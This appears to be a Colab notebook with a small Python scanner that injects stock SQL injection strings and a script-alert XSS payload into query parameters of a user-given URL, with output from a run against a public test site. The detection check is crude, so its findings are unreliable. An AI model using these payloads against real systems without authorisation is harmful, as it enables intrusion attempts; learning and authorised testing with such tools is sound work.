{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyM1scD3Ui8vJTREV47va9Dv",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Soumit-coder/python/blob/main/Untitled1.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NyxZN75UEfGN",
        "outputId": "a88971b7-12f9-46ef-a6cc-d6cd3fec6dff"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Enter target URL (e.g., http://testphp.vulnweb.com/page): http://testphp.vulnweb.com\n",
            "\n",
            "--- SQL Injection Test ---\n",
            "[!] SQL Injection possible at: http://testphp.vulnweb.com?id=' OR '1'='1\n",
            "[!] SQL Injection possible at: http://testphp.vulnweb.com?id=' OR 1=1--\n",
            "[!] SQL Injection possible at: http://testphp.vulnweb.com?id=' OR 'a'='a\n",
            "\n",
            "--- XSS Test ---\n",
            "[-] No XSS at: http://testphp.vulnweb.com?input=<script>alert('XSS')</script>\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "\n",
        "def scan_sql_injection(url):\n",
        "    print(\"\\n--- SQL Injection Test ---\")\n",
        "    payloads = [\"' OR '1'='1\", \"' OR 1=1--\", \"' OR 'a'='a\"]\n",
        "    for payload in payloads:\n",
        "        test_url = f\"{url}?id={payload}\"\n",
        "        res = requests.get(test_url)\n",
        "        if \"sql\" in res.text.lower() or \"syntax\" in res.text.lower():\n",
        "            print(f\"[!] SQL Injection possible at: {test_url}\")\n",
        "        else:\n",
        "            print(f\"[-] No SQL vulnerability at: {test_url}\")\n",
        "\n",
        "def scan_xss(url):\n",
        "    print(\"\\n--- XSS Test ---\")\n",
        "    xss_script = \"<script>alert('XSS')</script>\"\n",
        "    test_url = f\"{url}?input={xss_script}\"\n",
        "    res = requests.get(test_url)\n",
        "    if xss_script in res.text:\n",
        "        print(f\"[!] XSS vulnerability possible at: {test_url}\")\n",
        "    else:\n",
        "        print(f\"[-] No XSS at: {test_url}\")\n",
        "\n",
        "# Example: http://testphp.vulnweb.com/artists.php\n",
        "target_url = input(\"Enter target URL (e.g., http://testphp.vulnweb.com/page): \")\n",
        "scan_sql_injection(target_url)\n",
        "scan_xss(target_url)\n"
      ]
    }
  ]
}